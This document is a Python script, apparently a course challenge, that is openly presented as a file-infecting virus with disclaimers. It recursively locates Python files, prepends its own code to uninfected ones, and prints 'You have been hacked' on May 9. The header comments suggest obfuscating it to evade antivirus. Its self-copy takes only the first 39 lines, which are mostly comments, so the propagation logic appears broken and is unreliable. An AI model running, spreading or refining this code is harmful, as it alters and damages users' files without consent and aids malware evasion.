#!/usr/bin/env python3

# Script: Ops 301 ops chal-14
# Author: Justin H
# Date of latest revision
# Purpose: VIRUS -DONT RUN THIS-
# Team: M-n-M

# Note: The code presented here is a file-infecting virus and is for educational purposes only. Creating and distributing malware is illegal and unethical.
# This code is a file-infecting virus that targets Python scripts in the current directory and all its subdirectories. 
# It searches for files with the .py extension and checks if they are already infected by looking for the signature "VIRUS". 
# If a file is not infected, it adds it to the list of files to infect. 
# The virus then appends itself to the target files and saves the original contents to be executed later. 
# Finally, the virus activates itself on May 9th of any year by printing "You have been hacked" to the console.
# Core Python tools used:
# os library to interact with the operating system
# datetime library to get the current date and time
# The code could be improved by adding a way to encrypt or obfuscate the virus to avoid detection by antivirus software, 
# or by using better methods to infect the files that could make the virus harder to remove. 
# Additionally, creating malware is illegal and unethical, and it is important to use coding skills in a responsible and legal manner.
# This virus specifically targets Python scripts, but similar techniques could be used to target other file types. 

# Importing Python libraries
import os
import datetime

# Defining the signature for the virus
SIGNATURE = "VIRUS"

# Defining the function to locate files to infect
def locate(path):
    files_targeted = []
    # listing files in the given path
    filelist = os.listdir(path)
    for fname in filelist:
        # Checking if the path leads to a directory
        if os.path.isdir(path+"/"+fname):
            # recursively searching in the subdirectories
            files_targeted.extend(locate(path+"/"+fname))
        # Checking if the file is a Python script
        elif fname[-3:] == ".py":
            infected = False
            # Opening the file to check if it is already infected
            for line in open(path+"/"+fname):
                if SIGNATURE in line:
                    infected = True
                    break
            # If the file is not infected, add it to the list
            if not infected:
                files_targeted.append(path+"/"+fname)
    return files_targeted

# Defining the function to infect the identified files
def infect(files_targeted):
    virus = open(os.path.abspath(__file__))
    virusstring = ""
    # Extracting the first 39 lines of the virus
    for i,line in enumerate(virus):
        if 0 <= i < 39:
            virusstring += line
    virus.close()
    # Writing the virus to each of the files
    for fname in files_targeted:
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname,"w")
        f.write(virusstring + temp)
        f.close()

# Defining the function to activate the virus
def detonate():
    # Checking the current date and month
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        print("You have been hacked")

# Locating the files to infect
files_targeted = locate(os.path.abspath(""))

# Infecting the identified files
infect(files_targeted)

# Activating the virus
detonate()





